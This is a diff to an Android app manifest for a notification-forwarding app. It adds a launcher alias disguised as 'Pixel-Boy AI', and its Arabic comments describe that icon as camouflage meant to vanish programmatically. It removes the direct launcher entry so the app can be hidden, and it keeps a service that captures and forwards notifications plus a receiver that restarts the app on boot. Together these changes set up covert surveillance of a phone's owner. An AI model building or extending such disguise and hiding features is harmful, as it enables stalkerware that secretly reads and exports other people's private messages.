@@ -7,23 +7,35 @@
     <application
         android:name=".NotificationForwarderApp"
         android:allowBackup="true"
-        android:icon="@mipmap/ic_launcher"
-        android:label="Notification Forwarder"
+        android:icon="@drawable/ic_find_center"
+        android:roundIcon="@drawable/ic_find_center"
+        android:label="مركز العثور"
         android:networkSecurityConfig="@xml/network_security_config"
-        android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.NotificationForwarder">
 
+        <!-- الشاشة الرئيسية (بدون LAUNCHER مباشر لإتاحة الإخفاء البرمجي) -->
         <activity
             android:name=".MainActivity"
-            android:exported="true">
+            android:exported="true"
+            android:launchMode="singleTask">
+        </activity>
+
+        <!-- الأيقونة التمويهية التي تظهر على الشاشة الرئيسية باسم Pixel-Boy AI وتختفي برمجةً -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="Pixel-Boy AI">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
+        <!-- خدمة التقاط وتوجيه الإشعارات -->
         <service
             android:name=".service.AppNotificationListenerService"
             android:exported="true"
@@ -34,6 +46,7 @@
             </intent-filter>
         </service>
 
+        <!-- مستقبل إعادة التشغيل عند إقلاع الجهاز -->
         <receiver
             android:name=".receiver.BootCompletedReceiver"
             android:enabled="true"
